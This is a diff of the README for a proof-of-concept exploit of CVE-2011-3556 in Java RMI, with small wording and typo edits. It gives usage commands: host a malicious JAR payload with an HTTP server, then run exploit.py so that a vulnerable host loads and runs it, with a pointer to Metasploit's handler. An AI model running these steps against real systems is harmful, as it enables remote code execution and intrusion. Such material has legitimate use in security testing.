@@ -1,4 +1,4 @@
-# CVE-2011-3556 - Proof of Concept (PoC)
+# CVE-2011-3556 — Proof of Concept (PoC)
 
 ## Disclaimer
 
@@ -22,20 +22,20 @@ $ ./exploit.py --help && echo "It works!"
 
 ### Command-line
 
-To be remotely loaded by the vulnerable Java RMI server, the payload (a JAR binary) must be served as an HTTP resource. One could quickly serve it using the famous `python3 -h http.server`.
+To be remotely loaded by the vulnerable Java RMI server, the payload (a JAR binary) must be served as an HTTP resource. One could quickly serve it using the famous `python3 -m http.server`.
 
 Once the payload is made available for download, simply execute the `exploit.py` script to trigger the vulnerability.
 
 ```sh
-$ python3 -m http.server --bind <DELIVERY_HOST> <DELIVERY_PORT> &
-$ ./exploit.py -h <VULNERABLE_HOST> -u http://<DELIVERY_HOST>:<DELIVERY_PORT>/<PAYLOAD>`
+$ python3 -m http.server --bind DELIVERY_HOST DELIVERY_PORT &
+$ ./exploit.py -h VULNERABLE_HOST -u http://DELIVERY_HOST:DELIVERY_PORT/PAYLOAD.jar`
 ```
 
 > In case the payload is a Meterpreter (Metasploit Framework), do not forget to `use exploit/multi/handler`.
 
 ### Library
 
-This module can be used as a library by importing the `cve_2011_3556` module to your current namespace:
+This module can also be used as a library by importing the `cve_2011_3556` module to your current namespace:
 
 ```python
 from cve_2011_3556 import JavaRMIExploit
